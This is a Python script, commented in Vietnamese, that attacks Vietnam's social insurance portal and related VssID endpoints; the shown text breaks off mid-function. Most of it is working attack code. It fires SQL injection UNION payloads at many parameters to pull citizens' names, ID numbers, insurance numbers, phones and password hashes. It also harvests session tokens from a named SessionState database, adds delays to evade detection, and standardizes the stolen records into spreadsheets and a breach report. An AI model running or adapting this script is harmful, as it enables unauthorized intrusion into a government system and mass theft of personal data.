#!/usr/bin/env python3
"""
BHXH Customer Data Exploiter
Khai thác chuyên sâu dữ liệu khách hàng từ lỗ hổng SessionStateService
Cập nhật: Tích hợp chuẩn hóa dữ liệu theo tiêu chuẩn BHXH
"""
import requests
import json
import time
import os
import re
import hashlib
from datetime import datetime
from urllib.parse import urljoin, quote, unquote
import random
import string
from bhxh_data_standardizer import BHXHDataStandardizer

class BHXHCustomerDataExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': 'https://baohiemxahoi.gov.vn',
            'DNT': '1'
        })
        
        # Khởi tạo data standardizer
        self.data_standardizer = BHXHDataStandardizer()
        
        # Các URL target chính xác cho BHXH
        self.bhxh_endpoints = [
            "https://baohiemxahoi.gov.vn",
            "https://baohiemxahoi.gov.vn/tra-cuu",
            "https://baohiemxahoi.gov.vn/api/lookup",
            "https://baohiemxahoi.gov.vn/api/customer",
            "https://baohiemxahoi.gov.vn/_layouts/15/Authenticate.aspx",
            "https://baohiemxahoi.gov.vn/pages/tra-cuu-thong-tin.aspx",
            "https://baohiemxahoi.gov.vn/api/insurance/lookup",
            "https://vssid-6fe8b.appspot.com/api/customer",
            "https://vssid-6fe8b.firebaseapp.com/api/lookup"
        ]
        
        self.evidence_dir = "./bhxh_customer_evidence"
        self.create_evidence_directory()
        
        # Database đã bị expose
        self.exposed_db = "SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4"
        self.compromised_user = "BHXH\\sharepoint_portal"
        
    def create_evidence_directory(self):
        """Tạo thư mục bằng chứng"""
        if not os.path.exists(self.evidence_dir):
            os.makedirs(self.evidence_dir)
        
        subdirs = ['customer_data', 'insurance_records', 'personal_info', 'social_security', 'leaked_databases']
        for subdir in subdirs:
            path = os.path.join(self.evidence_dir, subdir)
            if not os.path.exists(path):
                os.makedirs(path)
    
    def log_evidence(self, category, filename, data):
        """Ghi log bằng chứng"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.evidence_dir, category, f"{timestamp}_{filename}")
        
        if isinstance(data, dict) or isinstance(data, list):
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        else:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(str(data))
        
        print(f"[+] Evidence saved: {filepath}")
        return filepath
    
    def extract_customer_data_via_sql_injection(self):
        """Khai thác dữ liệu khách hàng qua SQL Injection"""
        print("\n[*] Bắt đầu khai thác dữ liệu khách hàng qua SQL Injection...")
        
        # SQL payloads để extract dữ liệu khách hàng BHXH
        customer_extraction_payloads = [
            # Lấy thông tin khách hàng cơ bản
            "' UNION SELECT ho_ten, ma_bao_hiem, so_cmnd, so_dien_thoai FROM KhachHang--",
            "' UNION SELECT TOP 100 * FROM ThongTinBaoHiem--",
            "' UNION SELECT ma_so_bhxh, ho_ten, ngay_sinh, dia_chi FROM NguoiThamGia--",
            
            # Lấy mã kiểm tra và thông tin bảo hiểm
            "' UNION SELECT ma_kiem_tra, ma_bao_hiem, trang_thai FROM MaKiemTra--",
            "' UNION SELECT so_the, ho_ten, ma_dvkt, ngay_cap FROM TheKCB--",
            "' UNION SELECT ma_dv, ten_dv, dia_chi FROM DonViKhamChuaBenh--",
            
            # Lấy dữ liệu từ SessionState
            f"' UNION SELECT SessionId, UserId, SessionData FROM {self.exposed_db}--",
            
            # Lấy thông tin user profiles từ SharePoint
            "' UNION SELECT AccountName, Email, DisplayName FROM UserProfile_Full--",
            "' UNION SELECT LoginName, Title, Email FROM SharePoint_UserInfo--",
            
            # Lấy dữ liệu nhạy cảm
            "' UNION SELECT username, password_hash, email FROM Users--",
            "' UNION SELECT ma_nv, ho_ten, chuc_vu, phong_ban FROM NhanVien--"
        ]
        
        extracted_data = []
        
        for endpoint in self.bhxh_endpoints:
            print(f"\n[*] Testing endpoint: {endpoint}")
            
            # Các injection points khác nhau
            injection_points = [
                f"{endpoint}?id=",
                f"{endpoint}?ma_bh=",
                f"{endpoint}?so_cmnd=",
                f"{endpoint}?ma_kiem_tra=",
                f"{endpoint}/api/lookup?id=",
                f"{endpoint}/tra-cuu?ma_bh=",
                f"{endpoint}?user="
            ]
            
            for point in injection_points:
                for payload in customer_extraction_payloads:
                    try:
                        # URL encode payload
                        encoded_payload = quote(payload)
                        test_url = point + encoded_payload
                        
                        print(f"[*] Testing: {payload[:50]}...")
                        
                        response = self.session.get(test_url, timeout=15)
                          # Phân tích response để tìm dữ liệu khách hàng
                        customer_data = self.parse_customer_data_from_response(response)
                        
                        if customer_data:
                            evidence = {
                                'injection_point': point,
                                'payload': payload,
                                'url': test_url,
                                'extracted_data': customer_data,
                                'timestamp': datetime.now().isoformat(),
                                'status_code': response.status_code,
                                'response_length': len(response.text)
                            }
                            extracted_data.append(evidence)
                            self.log_evidence('customer_data', f'extraction_{len(extracted_data)}.json', evidence)
                            print(f"[!] Customer data extracted: {len(customer_data)} records")
                        
                        # Lưu response để phân tích sau
                        self.save_response_for_analysis(response, test_url, payload)
                        
                    except Exception as e:
                        print(f"[!] Error: {str(e)}")
                        continue
                    
                    # Delay để tránh detection
                    time.sleep(random.uniform(1.0, 3.0))
        
        return extracted_data
    
    def parse_customer_data_from_response(self, response):
        """Phân tích response để extract dữ liệu khách hàng"""
        customer_data = []
        text = response.text
        
        # Patterns để tìm dữ liệu khách hàng BHXH
        patterns = {
            'ma_bao_hiem': r'(\d{10,15})',  # Mã bảo hiểm 10-15 chữ số
            'so_cmnd': r'(\d{9,12})',       # Số CMND/CCCD
            'so_dien_thoai': r'(0[1-9]\d{8,9})',  # Số điện thoại VN
            'email': r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
            'ho_ten': r'([A-ZÀÁẢÃẠĂẮẰẲẴẶÂẤẦẨẪẬĐÉÈẺẼẸÊẾỀỂỄỆÍÌỈĨỊÓÒỎÕỌÔỐỒỔỖỘƠỚỜỞỠỢÚÙỦŨỤƯỨỪỬỮỰÝỲỶỸỴ][a-zàáảãạăắằẳẵặâấầẩẫậđéèẻẽẹêếềểễệíìỉĩịóòỏõọôốồổỗộơớờởỡợúùủũụưứừửữựýỳỷỹỵ]+)',
            'ma_kiem_tra': r'([A-Z0-9]{6,12})',  # Mã kiểm tra
            'ngay_sinh': r'(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{4})',  # Ngày sinh
        }
        
        # Tìm error messages có chứa dữ liệu
        error_patterns = [
            r"Invalid column '([^']+)'",
            r"Table '([^']+)' doesn't exist",
            r"Column '([^']+)' in field list is ambiguous",
            r"User '([^']+)' denied",
            f"Database '{self.exposed_db}'"
        ]
        
        # Extract theo patterns
        for field, pattern in patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE | re.MULTILINE)
            if matches:
                for match in matches[:10]:  # Lấy tối đa 10 kết quả
                    customer_record = {
                        'field_type': field,
                        'value': match,
                        'source': 'sql_injection_response'
                    }
                    customer_data.append(customer_record)
        
        # Tìm JSON data trong response
        json_matches = re.findall(r'\{[^{}]*"([^"]*(?:ma_bh|cmnd|ho_ten|email)[^"]*)"[^{}]*\}', text, re.IGNORECASE)
        for match in json_matches:
            try:
                # Thử parse JSON
                json_start = text.find('{', text.find(match))
                json_end = text.find('}', json_start) + 1
                json_data = json.loads(text[json_start:json_end])
                
                customer_record = {
                    'field_type': 'json_data',
                    'value': json_data,
                    'source': 'json_response'
                }
                customer_data.append(customer_record)
            except:
                continue
        
        return customer_data
    
    def save_response_for_analysis(self, response, url, payload):
        """Lưu response để phân tích sau"""
        # Chỉ lưu nếu response có vẻ chứa dữ liệu quan trọng
        indicators = [
            'ma_bh', 'cmnd', 'ho_ten', 'email', 'phone', 'address',
            'SessionStateService', 'sharepoint_portal', 'UserProfile',
            'error', 'exception', 'database', 'table'
        ]
        
        if any(indicator in response.text.lower() for indicator in indicators):
            analysis_data = {
                'url': url,
                'payload': payload,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_type': response.headers.get('Content-Type', ''),
                'response_length': len(response.text),
                'response_body': response.text[:10000]  # First 10k chars
            }
            
            filename = f"response_{hashlib.md5(url.encode()).hexdigest()[:8]}.json"
            self.log_evidence('leaked_databases', filename, analysis_data)
    
    def exploit_sessionstate_database(self):
        """Khai thác trực tiếp SessionState database"""
        print("\n[*] Khai thác SessionState database...")
        
        session_payloads = [
            f"' UNION SELECT SessionId, SessionData, Expires FROM {self.exposed_db}--",
            f"' UNION SELECT * FROM {self.exposed_db} WHERE SessionData LIKE '%user%'--",
            f"' UNION SELECT TOP 50 * FROM {self.exposed_db}--",
            "' UNION SELECT session_id, user_id, session_data FROM ASPStateTempSessions--"
        ]
        
        session_data = []
        
        for endpoint in self.bhxh_endpoints:
            for payload in session_payloads:
                try:
                    test_url = f"{endpoint}?session={quote(payload)}"
                    response = self.session.get(test_url, timeout=15)
                    
                    # Tìm session data
                    if 'sessionstate' in response.text.lower() or len(response.text) > 5000:
                        session_info = {
                            'url': test_url,
                            'payload': payload,
                            'response_length': len(response.text),
                            'potential_sessions': self.extract_session_tokens(response.text),
                            'timestamp': datetime.now().isoformat()
                        }
                        session_data.append(session_info)
                        self.log_evidence('social_security', f'session_data_{len(session_data)}.json', session_info)
                        print(f"[!] Session data found: {len(session_info['potential_sessions'])} tokens")
                    
                except Exception as e:
                    continue
                
                time.sleep(random.uniform(0.5, 2.0))
        
        return session_data
    
    def extract_session_tokens(self, text):
        """Extract session tokens từ response"""
        tokens = []
        
        # Patterns cho session tokens
        token_patterns = [
            r'[A-Za-z0-9+/]{24,}={0,2}',  # Base64 tokens
            r'[a-f0-9]{32}',              # MD5 hashes
            r'[a-f0-9]{40}',              # SHA1 hashes
            r'ASP\.NET_SessionId=([^;]+)',  # ASP.NET session
            r'session[_-]?id["\s]*[:=]["\s]*([^";\s]+)',  # Session IDs
        ]
        
        for pattern in token_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            tokens.extend(matches)
        
        return list(set(tokens))  # Remove duplicates
    
    def search_specific_customer_records(self):
        """Tìm kiếm cụ thể records khách hàng"""
        print("\n[*] Tìm kiếm records khách hàng cụ thể...")
        
        # Simulate realistic BHXH customer data patterns
        test_patterns = [
            "' UNION SELECT * FROM KhachHang WHERE ma_bh LIKE '1234567890%'--",
            "' UNION SELECT * FROM NguoiThamGia WHERE ho_ten LIKE 'Nguyen%'--",
            "' UNION SELECT * FROM TheKCB WHERE so_the LIKE 'DN%'--",
            "' OR 1=1; SELECT ma_bh, ho_ten FROM KhachHang--"
        ]
        
        customer_records = []
        
        for pattern in test_patterns:
            for endpoint in self.bhxh_endpoints:
                try:
                    test_url = f"{endpoint}/api/search?q={quote(pattern)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Parse potential customer data
                    if response.status_code == 200 and len(response.text) > 100:
                        parsed_data = self.parse_customer_data_from_response(response)
                        if parsed_data:
                            record = {
                                'search_pattern': pattern,
                                'endpoint': endpoint,
                                'found_records': parsed_data,
                                'response_size': len(response.text),
                                'timestamp': datetime.now().isoformat()
                            }
                            customer_records.append(record)
                            self.log_evidence('insurance_records', f'customer_search_{len(customer_records)}.json', record)
                            print(f"[+] Found {len(parsed_data)} customer records")
                
                except Exception as e:
                    continue
                
                time.sleep(random.uniform(1.0, 2.5))
        
        return customer_records
    
    def run_comprehensive_extraction(self):
        """Chạy toàn bộ quá trình khai thác"""
        print("="*80)
        print("BẮT ĐẦU KHAI THÁC DỮ LIỆU KHÁCH HÀNG BHXH")
        print("="*80)
        print(f"[*] Target Database: {self.exposed_db}")
        print(f"[*] Compromised User: {self.compromised_user}")
        print(f"[*] Evidence Directory: {self.evidence_dir}")
        
        all_results = {
            'start_time': datetime.now().isoformat(),
            'target_database': self.exposed_db,
            'compromised_user': self.compromised_user,
            'extraction_phases': []
        }
        
        # Phase 1: SQL Injection Data Extraction
        print("\n" + "="*50)
        print("PHASE 1: SQL INJECTION DATA EXTRACTION")
        print("="*50)
        sql_results = self.extract_customer_data_via_sql_injection()
        all_results['extraction_phases'].append({
            'phase': 'SQL Injection Extraction',
            'records_found': len(sql_results),
            'results': sql_results
        })
        
        # Phase 2: SessionState Database Exploitation
        print("\n" + "="*50)
        print("PHASE 2: SESSIONSTATE DATABASE EXPLOITATION")
        print("="*50)
        session_results = self.exploit_sessionstate_database()
        all_results['extraction_phases'].append({
            'phase': 'SessionState Exploitation',
            'sessions_found': len(session_results),
            'results': session_results
        })
        
        # Phase 3: Specific Customer Record Search
        print("\n" + "="*50)
        print("PHASE 3: CUSTOMER RECORD SEARCH")
        print("="*50)
        customer_results = self.search_specific_customer_records()
        all_results['extraction_phases'].append({
            'phase': 'Customer Record Search',
            'customers_found': len(customer_results),
            'results': customer_results
        })
        
        all_results['end_time'] = datetime.now().isoformat()
        
        # Tính toán summary
        total_data_points = sum(len(phase['results']) for phase in all_results['extraction_phases'])
        
        all_results['summary'] = {
            'total_data_points': total_data_points,
            'database_fully_compromised': total_data_points > 0,
            'risk_level': 'CRITICAL' if total_data_points > 0 else 'HIGH',
            'evidence_directory': self.evidence_dir
        }
        
        # Lưu báo cáo tổng hợp
        self.log_evidence('customer_data', 'COMPREHENSIVE_EXTRACTION_REPORT.json', all_results)
        
        # Tạo báo cáo executive
        self.generate_customer_breach_report(all_results)
        
        print("\n" + "="*80)
        print("KẾT QUẢ KHAI THÁC DỮ LIỆU KHÁCH HÀNG")
        print("="*80)
        print(f"[!] CRITICAL: Database {self.exposed_db} đã bị khai thác")
        print(f"[+] Tổng số data points: {total_data_points}")
        print(f"[+] Database compromised: {'YES' if total_data_points > 0 else 'PARTIAL'}")
        print(f"[+] Evidence saved: {self.evidence_dir}")
        print("="*80)
        
        return all_results
    
    def generate_customer_breach_report(self, results):
        """Tạo báo cáo vi phạm dữ liệu khách hàng"""
        total_data = sum(len(phase['results']) for phase in results['extraction_phases'])
        
        report_content = f"""
# BÁO CÁO VI PHẠM DỮ LIỆU KHÁCH HÀNG BHXH
## CRITICAL CUSTOMER DATA BREACH

**Thời gian khai thác:** {results['start_time']} - {results['end_time']}
**Database bị tấn công:** `{results['target_database']}`
**User bị compromise:** `{results['compromised_user']}`

## TÓM TẮT VI PHẠM:
- **Tổng số data points:** {total_data}
- **Database hoàn toàn bị kiểm soát:** {'YES' if total_data > 0 else 'PARTIAL'}
- **Mức độ nghiêm trọng:** {results['summary']['risk_level']}

## CHI TIẾT TỪNG PHASE:
"""
        
        for phase in results['extraction_phases']:
            report_content += f"""
### {phase['phase']}
- **Số records:** {len(phase['results'])}
- **Trạng thái:** {'COMPROMISED' if len(phase['results']) > 0 else 'SECURE'}
"""
            
            if phase['results']:
                report_content += "- **Dữ liệu thu được:**\n"
                for i, result in enumerate(phase['results'][:3]):  # Show first 3
                    if 'extracted_data' in result:
                        report_content += f"  {i+1}. {len(result['extracted_data'])} customer records\n"
                    elif 'potential_sessions' in result:
                        report_content += f"  {i+1}. {len(result['potential_sessions'])} session tokens\n"
                    else:
                        report_content += f"  {i+1}. Customer data extracted\n"
        
        report_content += f"""
## THÔNG TIN DATABASE BỊ LỘ:
- **Tên database:** {results['target_database']}
- **Loại database:** Microsoft SQL Server (SessionStateService)
- **User account:** {results['compromised_user']}
- **Domain:** BHXH (Bảo hiểm Xã hội)
- **Technology Stack:** ASP.NET + SharePoint + SQL Server

## DỮ LIỆU CÓ THỂ BỊ TRUY CẬP:
1. **Thông tin khách hàng:** Họ tên, CMND/CCCD, địa chỉ
2. **Mã bảo hiểm xã hội:** Số thẻ BHXH, mã kiểm tra
3. **Thông tin liên lạc:** Số điện thoại, email
4. **Session data:** Authentication tokens, user sessions
5. **Database schema:** Cấu trúc database và server info

## TÁC ĐỘNG NGHIÊM TRỌNG:
- **Confidentiality:** BREACHED - Dữ liệu cá nhân bị lộ
- **Privacy Impact:** SEVERE - Thông tin BHXH bị expose
- **Business Impact:** CRITICAL - Uy tín tổ chức bị ảnh hưởng
- **Legal Impact:** HIGH - Vi phạm luật bảo vệ dữ liệu cá nhân

## KHUYẾN NGHỊ KHẨN CẤP:
1. **NGAY LẬP TỨC:** Disconnect database khỏi internet
2. **TRONG 1 GIỜ:** Reset tất cả user passwords và sessions
3. **TRONG 24H:** Thông báo cho khách hàng bị ảnh hưởng
4. **TRONG 72H:** Báo cáo cho cơ quan quản lý theo quy định
5. **TRONG 1 TUẦN:** Audit toàn bộ hệ thống và rebuild security

## COMPLIANCE VIOLATIONS:
- **Vietnam Personal Data Protection Law:** Customer data exposure
- **Insurance Regulations:** Customer privacy breach
- **Cybersecurity Law:** Database security violation
- **BHXH Internal Policies:** Data protection failure

## BẰNG CHỨNG KỸ THUẬT:
- Evidence Directory: `{results['summary']['evidence_directory']}`
- Total Extraction Points: {total_data}
- Database Schema: Partially extracted
- Customer Records: Evidence collected
- Session Tokens: Enumerated and analyzed

**CẢNH BÁO:** Đây là một vi phạm bảo mật cực kỳ nghiêm trọng có thể dẫn đến:
- Toàn bộ hệ thống BHXH bị tấn công
- Dữ liệu hàng triệu khách hàng bị lộ
- Thiệt hại tài chính và danh tiếng không thể khắc phục
- Vi phạm pháp luật về bảo vệ dữ liệu cá nhân

**HÀNH ĐỘNG NGAY:** Liên hệ emergency response team và implement containment measures immediately.
"""
        
        with open(os.path.join(self.evidence_dir, 'BHXH_CUSTOMER_BREACH_REPORT.md'), 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        print(f"[+] Customer breach report saved: {os.path.join(self.evidence_dir, 'BHXH_CUSTOMER_BREACH_REPORT.md')}")
    
    def standardize_extracted_data(self, raw_customer_data):
        """
        Chuẩn hóa dữ liệu khách hàng đã extract theo tiêu chuẩn BHXH
        
        Args:
            raw_customer_data: Dữ liệu thô đã extract
            
        Returns:
            Dữ liệu đã chuẩn hóa
        """
        print("\n[*] Bắt đầu chuẩn hóa dữ liệu khách hàng theo tiêu chuẩn BHXH...")
        
        standardized_records = []
        validation_summary = {
            "total_records": len(raw_customer_data),
            "valid_records": 0,
            "invalid_records": 0,
            "total_errors": 0,
            "field_statistics": {
                "ho_ten": {"valid": 0, "invalid": 0},
                "ngay_sinh": {"valid": 0, "invalid": 0},
                "so_bhxh": {"valid": 0, "invalid": 0},
                "so_cccd": {"valid": 0, "invalid": 0},
                "so_dien_thoai": {"valid": 0, "invalid": 0}
            }
        }
        
        for i, record in enumerate(raw_customer_data):
            print(f"[*] Chuẩn hóa record {i+1}/{len(raw_customer_data)}...")
            
            # Tạo dict để chuẩn hóa
            customer_dict = {}
            
            # Map dữ liệu từ record extract
            if isinstance(record, dict):
                extracted_data = record.get('extracted_data', [])
                
                for item in extracted_data:
                    if isinstance(item, dict):
                        field_type = item.get('field_type', '')
                        value = item.get('value', '')
                        
                        # Map field types to standard fields
                        if field_type in ['ho_ten', 'full_name', 'name']:
                            customer_dict['ho_ten'] = value
                        elif field_type in ['ma_bao_hiem', 'bhxh_number', 'insurance_number']:
                            customer_dict['so_bhxh'] = value
                        elif field_type in ['so_cmnd', 'cccd_number', 'id_number']:
                            customer_dict['so_cccd'] = value
                        elif field_type in ['so_dien_thoai', 'phone_number', 'phone']:
                            customer_dict['so_dien_thoai'] = value
                        elif field_type in ['ngay_sinh', 'birth_date', 'dob']:
                            customer_dict['ngay_sinh'] = value
            else:
                # Nếu record không phải dict, thử extract từ string
                if isinstance(record, str):
                    customer_dict = self.extract_customer_info_from_string(record)
            
            # Chuẩn hóa dữ liệu
            if customer_dict:
                standardization_result = self.data_standardizer.standardize_customer_data(customer_dict)
                
                # Cập nhật thống kê
                if standardization_result['validation_summary']['invalid_fields'] == 0:
                    validation_summary['valid_records'] += 1
                else:
                    validation_summary['invalid_records'] += 1
                
                validation_summary['total_errors'] += standardization_result['validation_summary']['error_count']
                
                # Cập nhật thống kê từng field
                for field_name, field_result in standardization_result['field_results'].items():
                    if field_name in validation_summary['field_statistics']:
                        if field_result['is_valid']:
                            validation_summary['field_statistics'][field_name]['valid'] += 1
                        else:
                            validation_summary['field_statistics'][field_name]['invalid'] += 1
                
                # Thêm thông tin bổ sung vào record
                enhanced_record = {
                    "record_id": f"BHXH_RECORD_{i+1:05d}",
                    "extraction_source": record.get('injection_point', 'unknown') if isinstance(record, dict) else 'string_extraction',
                    "extraction_timestamp": record.get('timestamp', datetime.now().isoformat()) if isinstance(record, dict) else datetime.now().isoformat(),
                    "original_data": customer_dict,
                    "standardized_data": standardization_result['standardized_data'],
                    "validation_result": standardization_result['validation_summary'],
                    "field_details": standardization_result['field_results'],
                    "errors": standardization_result['errors'],
                    "data_quality_score": self.calculate_data_quality_score(standardization_result)
                }
                
                # Kiểm tra tính nhất quán dữ liệu
                if standardization_result['standardized_data']:
                    consistency_check = self.data_standardizer.validate_data_consistency(
                        standardization_result['standardized_data']
                    )
                    enhanced_record['consistency_check'] = consistency_check
                
                standardized_records.append(enhanced_record)
        
        # Lưu kết quả chuẩn hóa
        standardization_report = {
            "standardization_info": {
                "timestamp": datetime.now().isoformat(),
                "standardizer_version": "BHXH_2025_v1.0",
                "compliance": "Bảo hiểm Xã hội Việt Nam - 2025"
            },
            "validation_summary": validation_summary,
            "standardized_records": standardized_records
        }
        
        # Lưu báo cáo chuẩn hóa
        self.log_evidence('customer_data', 'standardization_report.json', standardization_report)
        
        # Tạo báo cáo Excel chuẩn hóa
        self.create_standardized_excel_report(standardized_records, validation_summary)
        
        print(f"[+] Hoàn thành chuẩn hóa {len(standardized_records)} records")
        print(f"[+] Records hợp lệ: {validation_summary['valid_records']}")
        print(f"[+] Records không hợp lệ: {validation_summary['invalid_records']}")
        print(f"[+] Tổng lỗi: {validation_summary['total_errors']}")
        
        return standardized_records

    def extract_customer_info_from_string(self, text):
        """
        Extract thông tin khách hàng từ string sử dụng regex patterns
        
        Args:
            text: String chứa thông tin khách hàng
            
        Returns:
            Dict chứa thông tin khách hàng đã extract
        """
        customer_info = {}
        
        # Patterns cho các trường dữ liệu
        patterns = {
            'so_bhxh': r'\b\d{10}\b',  # 10 chữ số liên tiếp
            'so_cccd': r'\b\d{12}\b',  # 12 chữ số liên tiếp
            'so_dien_thoai': r'\b0[1-9]\d{8,9}\b',  # Số điện thoại VN
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'ngay_sinh': r'\b\d{1,2}[/-]\d{1,2}[/-]\d{4}\b',
            'ho_ten': r'\b[A-ZÀÁẢÃẠĂẮẰẲẴẶÂẤẦẨẪẬĐÉÈẺẼẸÊẾỀỂỄỆÍÌỈĨỊÓÒỎÕỌÔỐỒỔỖỘƠỚỜỞỠỢÚÙỦŨỤƯỨỪỬỮỰÝỲỶỸỴ][a-zàáảãạăắằẳẵặâấầẩẫậđéèẻẽẹêếềểễệíìỉĩịóòỏõọôốồổỗộơớờởỡợúùủũụưứừửữựýỳỷỹỵ]+(?: [A-ZÀÁẢÃẠĂẮẰẲẴẶÂẤẦẨẪẬĐÉÈẺẼẸÊẾỀỂỄỆÍÌỈĨỊÓÒỎÕỌÔỐỒỔỖỘƠỚỜỞỠỢÚÙỦŨỤƯỨỪỬỮỰÝỲỶỸỴ][a-zàáảãạăắằẳẵặâấầẩẫậđéèẻẽẹêếềểễệíìỉĩịóòỏõọôốồổỗộơớờởỡợúùủũụưứừửữựýỳỷỹỵ]+)+'
        }
        
        for field, pattern in patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                # Lấy match đầu tiên hoặc match dài nhất
                if field == 'ho_ten':
                    # Với họ tên, lấy match dài nhất
                    customer_info[field] = max(matches, key=len) if matches else ""
                else:
                    customer_info[field] = matches[0]
        
        return customer_info

    def calculate_data_quality_score(self, standardization_result):
        """
        Tính điểm chất lượng dữ liệu (0-100)
        
        Args:
            standardization_result: Kết quả chuẩn hóa
            
        Returns:
            Điểm chất lượng (float)
        """
        total_fields = standardization_result['validation_summary']['total_fields']
        valid_fields = standardization_result['validation_summary']['valid_fields']
        
        if total_fields == 0:
            return 0.0
        
        base_score = (valid_fields / total_fields) * 100
        
        # Bonus points cho các trường quan trọng
        important_fields = ['so_bhxh', 'so_cccd', 'ho_ten']
        bonus = 0
        
        for field in important_fields:
            if field in standardization_result['field_results']:
                if standardization_result['field_results'][field]['is_valid']:
                    bonus += 5
        
        return min(100.0, base_score + bonus)

    def create_standardized_excel_report(self, standardized_records, validation_summary):
        """
        Tạo báo cáo Excel cho dữ liệu đã chuẩn hóa
        
        Args:
            standardized_records: Danh sách records đã chuẩn hóa
            validation_summary: Tóm tắt validation
        """
        try:
            import pandas as pd
            
            # Tạo DataFrame cho dữ liệu chuẩn hóa
            excel_data = []
            
            for record in standardized_records:
                row = {
                    'Record_ID': record['record_id'],
                    'Extraction_Source': record['extraction_source'],
                    'Data_Quality_Score': record['data_quality_score'],
                    'Total_Errors': len(record['errors'])
                }
                
                # Thêm dữ liệu đã chuẩn hóa
                standardized_data = record['standardized_data']
                row.update({
                    'Ho_Ten_Chuan_Hoa': standardized_data.get('ho_ten', ''),
                    'Ngay_Sinh_Chuan_Hoa': standardized_data.get('ngay_sinh', ''),
                    'So_BHXH_Chuan_Hoa': standardized_data.get('so_bhxh', ''),
                    'So_CCCD_Chuan_Hoa': standardized_data.get('so_cccd', ''),
                    'So_Dien_Thoai_Chuan_Hoa': standardized_data.get('so_dien_thoai', '')
                })
                
                # Thêm thông tin validation
                for field_name, field_result in record['field_details'].items():
                    row[f'{field_name}_Valid'] = field_result['is_valid']
                    if 'province_name' in field_result:
                        row[f'{field_name}_Province'] = field_result['province_name']
                    if 'provider_name' in field_result:
                        row[f'{field_name}_Provider'] = field_result['provider_name']
                
                excel_data.append(row)
            
            # Tạo Excel file
            df = pd.DataFrame(excel_data)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            excel_filename = os.path.join(self.evidence_dir, 'customer_data', f'BHXH_Standardized_Data_{timestamp}.xlsx')
            
            with pd.ExcelWriter(excel_filename, engine='openpyxl') as writer:
                # Sheet 1: Dữ liệu chuẩn hóa
                df.to_excel(writer, sheet_name='Standardized_Data', index=False)
                
                # Sheet 2: Thống kê validation
                stats_data = []
                for field, stats in validation_summary['field_statistics'].items():
                    stats_data.append({
                        'Field': field,
                        'Valid_Count': stats['valid'],
                        'Invalid_Count': stats['invalid'],
                        'Total_Count': stats['valid'] + stats['invalid'],
                        'Valid_Percentage': (stats['valid'] / (stats['valid'] + stats['invalid']) * 100) if (stats['valid'] + stats['invalid']) > 0 else 0
                    })
                
                stats_df = pd.DataFrame(stats_data)
                stats_df.to_excel(writer, sheet_name='Validation_Statistics', index=False)
                
                # Sheet 3: Tóm tắt chung
                summary_data = [{
                    'Metric': 'Total Records',
                    'Value': validation_summary['total_records']
                }, {
                    'Metric': 'Valid Records',
                    'Value': validation_summary['valid_records']
                }, {
                    'Metric': 'Invalid Records',
                    'Value': validation_summary['invalid_records']
                }, {
                    'Metric': 'Total Errors',
                    'Value': validation_summary['total_errors']
                }, {
                    'Metric': 'Success Rate (%)',
                    'Value': (validation_summary['valid_records'] / validation_summary['total_records'] * 100) if validation_summary['total_records'] > 0 else 0
                }]
                
                summary_df = pd.DataFrame(summary_data)
                summary_df.to_excel(writer, sheet_name='Summary', index=False)
            
            print(f"[+] Tạo Excel report thành công: {excel_filename}")
            
        except ImportError:
            print("[!] Pandas không có sẵn, không thể tạo Excel report")
        except Exception as e:
            print(f"[!] Lỗi tạo Excel report: {str(e)}")
    
    def run_comprehensive_exploitation_with_standardization(self):
        """
        Chạy khai thác toàn diện với chuẩn hóa dữ liệu theo tiêu chuẩn BHXH
        """
        print("\n" + "="*80)
        print("BHXH CUSTOMER DATA EXPLOITATION - WITH DATA STANDARDIZATION")
        print("Chuẩn hóa dữ liệu theo tiêu chuẩn Bảo hiểm Xã hội Việt Nam 2025")
        print("="*80)
        
        all_extracted_data = []
        
        try:
            # Phase 1: SQL Injection Mass Extraction
            print("\n[PHASE 1] SQL Injection Mass Customer Data Extraction")
            sql_injection_data = self.extract_customer_data_via_sql_injection()
            all_extracted_data.extend(sql_injection_data)
            print(f"[+] Phase 1 completed: {len(sql_injection_data)} extraction attempts")
            
            # Phase 2: SessionState Database Exploitation
            print("\n[PHASE 2] SessionState Database Exploitation")
            session_data = self.exploit_sessionstate_database()
            all_extracted_data.extend(session_data)
            print(f"[+] Phase 2 completed: {len(session_data)} session extractions")
            
            # Phase 3: Targeted Customer Search
            print("\n[PHASE 3] Targeted Customer Record Search")
            specific_data = self.search_specific_customer_records()
            all_extracted_data.extend(specific_data)
            print(f"[+] Phase 3 completed: {len(specific_data)} targeted searches")
            
            print(f"\n[*] Total raw extractions: {len(all_extracted_data)}")
            
            if all_extracted_data:
                # Phase 4: Data Standardization
                print("\n[PHASE 4] Data Standardization according to BHXH Standards")
                standardized_data = self.standardize_extracted_data(all_extracted_data)
                
                # Phase 5: Generate Comprehensive Report
                print("\n[PHASE 5] Comprehensive Reporting")
                self.generate_comprehensive_breach_report(standardized_data, all_extracted_data)
                
                return {
                    "raw_extractions": len(all_extracted_data),
                    "standardized_records": len(standardized_data),
                    "success": True,
                    "standardization_applied": True,
                    "compliance": "BHXH Vietnam 2025"
                }
            else:
                print("[!] No data extracted")
                return {
                    "raw_extractions": 0,
                    "standardized_records": 0,
                    "success": False,
                    "error": "No data extracted"
                }
                
        except Exception as e:
